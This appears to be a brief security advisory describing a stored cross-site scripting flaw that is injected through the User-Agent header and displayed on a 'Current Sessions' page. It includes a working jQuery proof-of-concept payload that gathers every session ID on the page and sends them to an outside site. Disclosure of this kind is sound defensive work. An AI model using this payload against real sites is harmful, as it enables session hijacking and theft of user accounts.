Vulnerability Details
=====================

A stored XSS vulnerability exists in the User-Agent header of the

-> Current Sessions.



POC
===

The POC uses jQuery to send all session IDs on the "Current Sessions"
page to an arbitrary site (Google, in this case)

<script>$('#ops_table
.ops_id').each(function(){$.get("https://www.google.com/",{session:($(this).html())});});</script>
